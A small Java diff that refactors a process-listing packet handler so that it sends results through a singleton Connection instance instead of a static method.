@@ -32,7 +32,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 				while ((line = reader.readLine()) != null) {		
 					if (line.length() > 0) {
-						Connection.addToSendQueue(new Packet25Process(line));
+						Connection.instance.addToSendQueue(new Packet25Process(line));
 					}
 				}
 				reader.close();
